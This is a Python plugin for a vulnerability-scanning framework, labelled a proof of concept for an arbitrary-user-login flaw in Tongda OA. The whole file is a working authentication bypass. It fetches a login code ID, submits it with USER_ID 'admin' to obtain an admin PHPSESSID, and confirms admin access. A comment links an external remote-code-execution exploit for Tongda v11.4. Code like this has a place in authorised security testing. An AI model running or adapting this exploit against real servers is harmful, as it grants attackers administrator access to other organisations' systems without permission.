from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger
from xing.core import PluginType, SchemeType
import re

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "通达 OA 任意用户登录"
        self.app_name = 'Tongda'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    #exp https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py
    #导入数据库脚本/general/system/database/sql.php
    def verify(self, target):
        paths = ["/general/login_code.php"]
        logincheck_path = "/logincheck_code.php"
        admin_path = "/general/index.php?isIE=0"
        self.logger.info("verify {}".format(target))
        for path in paths:
            codeid = self._get_codeid(target + path)
            if not codeid:
                break

            self.logger.info("found codeid on {}".format(target + path))

            logincheck_url = target + logincheck_path
            logincheck_data = {"UID": "1", "CODEUID": codeid, "USER_ID": "admin"}
            logincheck_conn = http_req(logincheck_url, 'post', data=logincheck_data)


            phpsessid = logincheck_conn.cookies.get("PHPSESSID")
            if not phpsessid:
                break

            self.logger.info("found phpsessid on {}".format(logincheck_url))

            admin_url = target + admin_path
            admin_cookie = {"PHPSESSID": phpsessid}
            admin_conn = http_req(admin_url, 'get', cookies=admin_cookie)
            result = re.findall("var cur_login_user_id=\"(.*?)\"", admin_conn.text)
            if  result and result[0] == "admin":
                self.logger.success("found vul {}".format(admin_url))
                return admin_url


    def _get_codeid(self, url):
        data = {"UID": "1", "CODEUID": ''}
        codeid = http_req(url, 'post', data=data).content[-46:-8]
        if not re.findall(b'\{[a-zA-Z0-9-]{36}\}', codeid):
            return

        return codeid.decode('utf8')


